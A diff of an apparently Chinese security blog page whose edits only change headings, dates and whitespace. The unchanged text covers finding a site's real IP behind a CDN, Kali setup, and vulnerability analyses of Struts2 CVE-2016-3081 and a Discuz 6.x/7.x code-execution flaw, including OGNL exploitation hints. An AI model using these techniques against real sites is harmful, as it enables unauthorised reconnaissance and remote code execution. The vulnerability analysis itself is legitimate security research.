@@ -253,7 +253,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:27:03" itemprop="dateModified" datetime="2019-07-25T14:27:03+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:08:17" itemprop="dateModified" datetime="2020-06-09T10:08:17+08:00">2020-06-09</time>
               </span>
 
           
@@ -325,7 +325,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-03-15 01:21:08" itemprop="dateModified" datetime="2019-03-15T01:21:08+08:00">2019-03-15</time>
+                <time title="Modified: 2020-06-09 10:09:48" itemprop="dateModified" datetime="2020-06-09T10:09:48+08:00">2020-06-09</time>
               </span>
 
           
@@ -341,8 +341,8 @@
       
           <a id="more"></a>
 
-<h1 id="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"><a href="#查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法" class="headerlink" title="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"></a>查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法</h1><p><strong>首先，CDN、负载均衡、反向代理还分为很多层，有时查出来的是最外层的 CDN 服务器群，真实的机器是不对外开放的，类似这样的：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------- </span><br><span class="line"></span><br><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台反向代理　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　Reverse Proxy Server　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br></pre></td></tr></table></figure>
+<h2 id="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"><a href="#查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法" class="headerlink" title="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"></a>查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法</h2><p><strong>首先，CDN、负载均衡、反向代理还分为很多层，有时查出来的是最外层的 CDN 服务器群，真实的机器是不对外开放的，类似这样的：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台真实机器</span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------</span><br><span class="line"></span><br><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台反向代理　　　→　　一台或多台真实机器</span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　Reverse Proxy Server　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br></pre></td></tr></table></figure>
 
 <p>具体根据网络的负载需求，CDN 服务器的数量以及分级层数是不一定的。</p>
 <p>如果是这样的话，除非日一台CDN服务器看记录或者日进CDN供应商控制系统或后台，才能找到真实IP，但是那些CDN服务器配置完全一样，应该很难搞。</p>
@@ -367,7 +367,7 @@
 <p>使用国外 vpn ping 的方法是因为，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns（那台vpn服务器使用的dns）查询域名而已，所以只需要：nslookup lcx.cc 国外dns，就行了，例如：nslookup lcx.cc 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少……</p>
 </blockquote>
 <p>1 历史记录(<a href="http://toolbar.netcraft.com/site_report?url=www.xxx.net" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.xxx.net</a>)</p>
-<p>2 phpinfo </p>
+<p>2 phpinfo</p>
 <p>3 经常用ping xxx.com代替ping <a href="http://www.xxx.com,然后ping子域,再nslookup" target="_blank" rel="noopener">www.xxx.com,然后ping子域,再nslookup</a></p>
 <p><strong>有的服务器本地自带sendmail…  注册之后，会主动发一封邮件给我们。。。 好吧。。打开邮件的源代码。。 你就能看到服务器的真实Ip了。。。有的大型互联网网站会有自己的Mailserver…应该也是处在一个网段吧？？  那个网段打开80的一个一个试。。。哈哈。。</strong></p>
 
@@ -420,7 +420,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:27:44" itemprop="dateModified" datetime="2019-07-25T14:27:44+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:10:59" itemprop="dateModified" datetime="2020-06-09T10:10:59+08:00">2020-06-09</time>
               </span>
 
           
@@ -436,7 +436,7 @@
       
           <a id="more"></a>
 
-<h1 id="Mantra-Browser-crash"><a href="#Mantra-Browser-crash" class="headerlink" title="Mantra Browser crash"></a>Mantra Browser crash</h1><p><img src="https://camo.githubusercontent.com/e1d81bb96e290c1e4cb21fc0548f365c2cb6ca58/687474703a2f2f322e62702e626c6f6773706f742e636f6d2f2d6d476c6438576d505237492f55575f624b3262445041492f41414141414141414158302f6a7758664b436a425150492f73313630302f53637265656e73686f742b2d2b30343138323031332b2d2b30363a33333a30312b504d2e706e67" alt=""></p>
+<h2 id="Mantra-Browser-crash"><a href="#Mantra-Browser-crash" class="headerlink" title="Mantra Browser crash"></a>Mantra Browser crash</h2><p><img src="https://camo.githubusercontent.com/e1d81bb96e290c1e4cb21fc0548f365c2cb6ca58/687474703a2f2f322e62702e626c6f6773706f742e636f6d2f2d6d476c6438576d505237492f55575f624b3262445041492f41414141414141414158302f6a7758664b436a425150492f73313630302f53637265656e73686f742b2d2b30343138323031332b2d2b30363a33333a30312b504d2e706e67" alt=""></p>
 <p>Solution:</p>
 <p>Edit file “OWASP Mantra” and change the following lines:</p>
 <p><code>echo &quot;${app}portable:Debug/Info: 0=&quot;$0&quot;&quot;</code></p>
@@ -651,7 +651,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:29:08" itemprop="dateModified" datetime="2019-07-25T14:29:08+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:10:12" itemprop="dateModified" datetime="2020-06-09T10:10:12+08:00">2020-06-09</time>
               </span>
 
           
@@ -668,9 +668,9 @@
           <a id="more"></a>
 
 <h2 id="Kali-linux-使用记录"><a href="#Kali-linux-使用记录" class="headerlink" title="Kali linux 使用记录"></a>Kali linux 使用记录</h2><p><img src="http://image.3001.net/images/20160130/14540858194014.png" alt=""></p>
-<h1 id="安装完Kali-linux-之后的配置-常用软件-记录"><a href="#安装完Kali-linux-之后的配置-常用软件-记录" class="headerlink" title="安装完Kali linux 之后的配置 常用软件 记录"></a>安装完Kali linux 之后的配置 常用软件 记录</h1><p>[TOC]</p>
-<h2 id="0x01-更换源并更新"><a href="#0x01-更换源并更新" class="headerlink" title="0x01 更换源并更新"></a>0x01 更换源并更新</h2><p><code>root@kali:~# leafpad /etc/apt/sources.list</code></p>
-<pre><code>#kali官方源 
+<h2 id="安装完Kali-linux-之后的配置-常用软件-记录"><a href="#安装完Kali-linux-之后的配置-常用软件-记录" class="headerlink" title="安装完Kali linux 之后的配置 常用软件 记录"></a>安装完Kali linux 之后的配置 常用软件 记录</h2><p>[TOC]</p>
+<h3 id="0x01-更换源并更新"><a href="#0x01-更换源并更新" class="headerlink" title="0x01 更换源并更新"></a>0x01 更换源并更新</h3><p><code>root@kali:~# leafpad /etc/apt/sources.list</code></p>
+<pre><code>#kali官方源
 deb cdrom:[Debian GNU/Linux 2.0 _Sana_ - Official Snapshot i386 LIVE/INSTALL Binary 20150811-09:06]/ sana contrib main non-free
 deb cdrom:[Debian GNU/Linux 2.0 _Sana_ - Official Snapshot i386 LIVE/INSTALL Binary 20150811-09:06]/ sana contrib main non-free
 deb http://http.kali.org/kali sana main non-free contrib
@@ -739,14 +739,14 @@ sudo fc-cache -fv</code></pre><p>最后，去系统－首选项－高级设置 �
 <p> 其次<code>root@kali:update-flashplugin-nonfree –install</code></p>
 </li>
 <li><p>安装Tor Browser</p>
-<pre><code>root@kali:apt-get install tor 
-root@kali:service tor start 
+<pre><code>root@kali:apt-get install tor
+root@kali:service tor start
 root@kali:proxychains iceweasel</code></pre></li>
 </ol>
 <h2 id="0x05-拼音输入法（需要注销重新登录）"><a href="#0x05-拼音输入法（需要注销重新登录）" class="headerlink" title="0x05 拼音输入法（需要注销重新登录）"></a>0x05 拼音输入法（需要注销重新登录）</h2><pre><code>apt-get install ibus ibus-pinyin              #经典的ibus
 apt-get install fcitx fcitx-pinyin fcitx-module-cloudpinyin fcitx-googlepinyin    #fcitx拼音</code></pre><h2 id="0x06-科学上网"><a href="#0x06-科学上网" class="headerlink" title="0x06 科学上网"></a>0x06 科学上网</h2><ul>
 <li><p>默认安装，是没有激活VPN的，能看到VPN选项，但是不能点击VPN连接</p>
-<pre><code>apt-get install -y pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome </code></pre></li>
+<pre><code>apt-get install -y pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome</code></pre></li>
 <li><p><a href="https://github.com/getlantern/lantern-binaries" target="_blank" rel="noopener">lantern</a></p>
 <p>  方法就是下载对应的版本，然后dpkg安装下，然后打开lantern自动跳转到浏览器，然后就没有然后了。。。</p>
 </li>
@@ -807,7 +807,7 @@ bff9VcTSJk7sRDLqKRVz1XGKbMqw3G
 =========== Sjolzy.cn =============</code></pre></li>
 <li><p>安装add-apt-repository和pip</p>
 <pre><code>add-apt-repository
-apt-get install python-software-properties 
+apt-get install python-software-properties
 nano app-apt-repository.sh
 
 #!/bin/bash        // 添加如下代码
@@ -853,13 +853,13 @@ update-alternatives --config javac</code></pre></li>
 <pre><code>/*
 sublime-imfix.c
 Use LD_PRELOAD to interpose some function to fix sublime input method support for linux.
-By Cjacker Huang 
+By Cjacker Huang
 
 gcc -shared -o libsublime-imfix.so sublime_imfix.c  `pkg-config --libs --cflags gtk+-2.0` -fPIC
 LD_PRELOAD=./libsublime-imfix.so sublime_text
 */
-#include 
-#include 
+#include
+#include
 typedef GdkSegment GdkRegionBox;
 
 struct _GdkRegion
@@ -887,8 +887,8 @@ gdk_region_get_clipbox (const GdkRegion *region,
   rect.x = rectangle-&gt;x;
   rect.y = rectangle-&gt;y;
   rect.width = 0;
-  rect.height = rectangle-&gt;height; 
-  //The caret width is 2; 
+  rect.height = rectangle-&gt;height;
+  //The caret width is 2;
   //Maybe sometimes we will make a mistake, but for most of the time, it should be the caret.
   if(rectangle-&gt;width == 2 &amp;&amp; GTK_IS_IM_CONTEXT(local_context)) {
         gtk_im_context_set_cursor_location(local_context, rectangle);
@@ -927,7 +927,7 @@ void gtk_im_context_set_client_window (GtkIMContext *context,
     gtk_im_context_focus_in(context);
     local_context = context;
   }
-  gdk_window_add_filter (window, event_filter, context); 
+  gdk_window_add_filter (window, event_filter, context);
 }</code></pre></li>
 <li><p>编译动态库</p>
 <pre><code>gcc -shared -o libsublime-imfix.so sublime_imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC</code></pre></li>
@@ -1025,7 +1025,7 @@ http://www.blackmoreops.com/2014/02/27/change-install-theme-kali-linux-gtk-3-the
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:29:32" itemprop="dateModified" datetime="2019-07-25T14:29:32+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:09:42" itemprop="dateModified" datetime="2020-06-09T10:09:42+08:00">2020-06-09</time>
               </span>
 
           
@@ -1041,8 +1041,8 @@ http://www.blackmoreops.com/2014/02/27/change-install-theme-kali-linux-gtk-3-the
       
           <a id="more"></a>
 
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">DVWA</a></p>
-<h1 id="Kali-linux-部署-DVWA"><a href="#Kali-linux-部署-DVWA" class="headerlink" title="Kali linux 部署 DVWA"></a>Kali linux 部署 DVWA</h1><p>参考链接: <a href="http://my.oschina.net/sukai/blog/166811" target="_blank" rel="noopener">Kali linux 部署 DVWA</a></p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载<a href="https://www.apachefriends.org/zh_cn/download.html" target="_blank" rel="noopener">DVWA</a></p>
+<h2 id="Kali-linux-部署-DVWA"><a href="#Kali-linux-部署-DVWA" class="headerlink" title="Kali linux 部署 DVWA"></a>Kali linux 部署 DVWA</h2><p>参考链接: <a href="http://my.oschina.net/sukai/blog/166811" target="_blank" rel="noopener">Kali linux 部署 DVWA</a></p>
 
       
     </div>
@@ -1190,7 +1190,7 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:30:30" itemprop="dateModified" datetime="2019-07-25T14:30:30+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:08:55" itemprop="dateModified" datetime="2020-06-09T10:08:55+08:00">2020-06-09</time>
               </span>
 
           
@@ -1206,17 +1206,17 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
       
           <a id="more"></a>
 
-<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><p>2016年4月21日Struts2官方发布两个CVE，其中CVE-2016-3081官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个“Possible Remote Code Execution”漏洞的被打的可能性还是很高的。</p>
-<h1 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h1><p>直接进行版本比对，我们可以看到针对这个问题，只对DefaultActionMapper.java这个文件进行了修改，修改内容如下：</p>
+<h2 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h2><p>2016年4月21日Struts2官方发布两个CVE，其中CVE-2016-3081官方评级为高。主要原因为在用户开启动态方法调用的情况下，会被攻击者实现远程代码执行攻击。从我自己搜索的情况来看，国内开启这个功能的网站不在少数，所以这个“Possible Remote Code Execution”漏洞的被打的可能性还是很高的。</p>
+<h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>直接进行版本比对，我们可以看到针对这个问题，只对DefaultActionMapper.java这个文件进行了修改，修改内容如下：</p>
 <p><img src="http://static.wooyun.org//drops/20160426/2016042610071380042.png" alt=""></p>
 <p>我们可以看到只是把method成员变量的值进行了一次过滤，cleanupActionName这个方法是在对“action:”滥用的问题进行添加的，禁止了绝大多数的特殊字符。但是在后来的版本变更中忽略了之前的问题，将method也引入了Ongl表达式，代码在DefaultAction.java的invokeAction中：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        Object methodResult;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            methodResult = ognlUtil.getValue(methodName + <span class="string">"()"</span>, getStack().getContext(), action);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"></span><br><span class="line">        Object methodResult;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            methodResult = ognlUtil.getValue(methodName + <span class="string">"()"</span>, getStack().getContext(), action);</span><br></pre></td></tr></table></figure>
 
 <p>我们可以看到methodName被带入到getValue了，熟悉Struts相关漏洞的朋友应该都明白这是什么意思，虽然后面被强制添加了一对圆括号，但是想办法语法补齐就好了。相对应的我们来看下在2.3.18版本之前的代码是怎么处理methodName的：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">boolean</span> methodCalled = <span class="keyword">false</span>;</span><br><span class="line">        Object methodResult = <span class="keyword">null</span>;</span><br><span class="line">        Method method = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = getAction().getClass().getMethod(methodName, EMPTY_CLASS_ARRAY);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">invokeAction</span><span class="params">(Object action, ActionConfig actionConfig)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String methodName = proxy.getMethod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">"Executing action method = #0"</span>, methodName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String timerKey = <span class="string">"invokeAction: "</span> + proxy.getActionName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        UtilTimerStack.push(timerKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> methodCalled = <span class="keyword">false</span>;</span><br><span class="line">        Object methodResult = <span class="keyword">null</span>;</span><br><span class="line">        Method method = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = getAction().getClass().getMethod(methodName, EMPTY_CLASS_ARRAY);</span><br></pre></td></tr></table></figure>
 
 <p>在这里使用的是反射，所以在这个漏洞发布的时候，我曾一瞬间觉得又是一个骗CVE的鸡肋，但是事实上，这是一个威胁很大的漏洞。但是官方说的受影响版本<code>Struts 2.0.0 - Struts Struts 2.3.28 (except 2.3.20.2 and 2.3.24.2)</code>是不严谨的，应该是<code>2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)</code>。</p>
-<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>利用方式主要难点在于两个地方，一个是上文提到的对于表达式最后的圆括号给予正确的表达式意义。另一个就是在传输过程中method会经过一次转义，双引号和单引号的没有办法使用了，所以需要找到一个绕过。剩下的就是原来套沙盒绕过，命令执行的那套东西了。</p>
 <p>对于圆括号，可以直接使用<code>new java.lang.String</code>这样来拼接成<code>new java.lang.String()</code>构成正确Ognl语法。</p>
 <p>至于不能使用引号的话，命令执行我们可以使用引用参数的方法来完成对字符串的提取，例如：使用#parameters.cmd来提取http的cmd参数。测试PoC如下：</p>
 <blockquote>
@@ -1225,7 +1225,7 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
 <p>效果如下图所示：</p>
 <p><img src="http://static.wooyun.org//drops/20160426/2016042610071333528.png" alt=""></p>
 <p>这里我小小的猜测一下，官方发布的日期是20，而漏洞提交team做宣传是在4月25日，那么是不是在提交CVE时还没有完成弹计算器的利用，还是为了符合漏洞提交规范做的延时？小八卦一下O(∩_∩)O。</p>
-<h1 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h1><p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p>
+<h2 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h2><p>虽然现在CVE已经发布，但是从目前网络情况上（twitter和微博）来看，并没有安全研究人员关注到这两个CVE，可能是因为官方发布过太多鸡肋的CVE了，国内的各路炒洞高手已经对Struts2麻木了。所以目前的情况是属于漏洞存在那里，发了CVE，但是没有任何人去研究利用，发布相关分析。这个漏洞和Struts2前N次被炒的热热闹闹的漏洞影响和危害相比，真是不可同日而语，这个漏洞真的很实在。</p>
 <p>看到这里，打算磨拳擦掌要去调回显PoC的朋友们，这里我要在提醒一次。虽然我在之前说了存在这个问题的站点很多，但是这个漏洞存在版本限制，在Struts2.3.18及其以上的版本才可以触发。而国内大多数的站点由于Struts在2.3.16之后再也没有出现过大的问题，所以绝大多数停留在2.3.16这个版本，这让这个看似很不错的漏洞略显鸡肋了。</p>
 <p><strong>防护方案</strong></p>
 <p>目前官方已经推出了<code>2.3.20.2、2.3.24.2</code>和<code>2.3.28.1</code>修复了这个问题，大家可以针对自己所使用的版本进行升级。下载地址：<a href="https://struts.apache.org/download.cgi#struts23281" target="_blank" rel="noopener">https://struts.apache.org/download.cgi#struts23281</a></p>
@@ -1282,7 +1282,7 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-07-25 14:30:17" itemprop="dateModified" datetime="2019-07-25T14:30:17+08:00">2019-07-25</time>
+                <time title="Modified: 2020-06-09 10:09:08" itemprop="dateModified" datetime="2020-06-09T10:09:08+08:00">2020-06-09</time>
               </span>
 
           
@@ -1298,7 +1298,7 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
       
           <a id="more"></a>
 
-<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
+<h2 id="Discuz-6-x-7-x-版本-前台任意代码执行漏洞"><a href="#Discuz-6-x-7-x-版本-前台任意代码执行漏洞" class="headerlink" title="Discuz! 6.x-7.x 版本 前台任意代码执行漏洞"></a>Discuz! 6.x-7.x 版本 前台任意代码执行漏洞</h2><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞。</p>
 <p>include/global.func.php代码里：</p>
 <pre><code>&lt;code id=&quot;code0&quot;&gt;function daddslashes($string, $force = 0) {
         !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());
@@ -1323,7 +1323,7 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
         exit(&apos;Request tainting attempted.&apos;);
 }</code></pre><p>这样就没法提交GLOBALS变量了么？</p>
 <p>$_REQUEST这个超全局变量的值受php.ini中request_order的影响,在最新的php5.3.x系列中,request_order默认值为GP,也就是说默认配置下$_REQUEST只包含$_GET和$_POST,而不包括$_COOKIE,那么我们就可以通过COOKIE来提交GLOBALS变量了:)</p>
-<h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p>include/discuzcode.func.php</p>
+<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>include/discuzcode.func.php</p>
 <pre><code>function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) {
         global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
         if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[ /code]&apos;) || strpos($message, &apos;[ /CODE]&apos;)) !== FALSE) {
@@ -1344,9 +1344,9 @@ Microsoft .NET Framework 1.0</code></pre><h2 id="描述"><a href="#描述" class
